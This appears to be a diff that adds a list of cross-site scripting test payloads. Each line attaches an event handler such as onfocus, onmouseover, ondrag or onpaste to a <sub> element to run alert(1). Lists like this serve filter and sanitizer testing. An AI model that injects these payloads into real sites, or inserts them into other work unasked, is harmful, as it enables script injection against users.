@@ -1,0 +1,43 @@
+<sub draggable="true" ondrag="alert(1)">test</sub>
+<sub draggable="true" ondragend="alert(1)">test</sub>
+<sub draggable="true" ondragenter="alert(1)">test</sub>
+<sub draggable="true" ondragleave="alert(1)">test</sub>
+<sub draggable="true" ondragstart="alert(1)">test</sub>
+<sub id=x tabindex=1 onactivate=alert(1)></sub>
+<sub id=x tabindex=1 onbeforeactivate=alert(1)></sub>
+<sub id=x tabindex=1 onbeforedeactivate=alert(1)></sub><input autofocus>
+<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>
+<sub id=x tabindex=1 onfocus=alert(1)></sub>
+<sub id=x tabindex=1 onfocusin=alert(1)></sub>
+<sub onafterscriptexecute=alert(1)><script>1</script>
+<sub onbeforecopy="alert(1)" contenteditable>test</sub>
+<sub onbeforecut="alert(1)" contenteditable>test</sub>
+<sub onbeforepaste="alert(1)" contenteditable>test</sub>
+<sub onbeforescriptexecute=alert(1)><script>1</script>
+<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>
+<sub onclick="alert(1)">test</sub>
+<sub oncontextmenu="alert(1)">test</sub>
+<sub oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<sub oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<sub ondblclick="alert(1)" autofocus tabindex=1>test</sub>
+<sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>
+<sub onkeydown="alert(1)" contenteditable>test</sub>
+<sub onkeypress="alert(1)" contenteditable>test</sub>
+<sub onkeyup="alert(1)" contenteditable>test</sub>
+<sub onmousedown="alert(1)">test</sub>
+<sub onmouseenter="alert(1)">test</sub>
+<sub onmouseleave="alert(1)">test</sub>
+<sub onmousemove="alert(1)">test</sub>
+<sub onmouseout="alert(1)">test</sub>
+<sub onmouseover="alert(1)">test</sub>
+<sub onmouseup="alert(1)">test</sub>
+<sub onmousewheel=alert(1)>requires scrolling
+<sub onpaste="alert(1)" contenteditable>test</sub>
+<sub onpointerdown=alert(1)>XSS</sub>
+<sub onpointerenter=alert(1)>XSS</sub>
+<sub onpointerleave=alert(1)>XSS</sub>
+<sub onpointermove=alert(1)>XSS</sub>
+<sub onpointerout=alert(1)>XSS</sub>
+<sub onpointerover=alert(1)>XSS</sub>
+<sub onpointerrawupdate=alert(1)>XSS</sub>
+<sub onpointerup=alert(1)>XSS</sub>
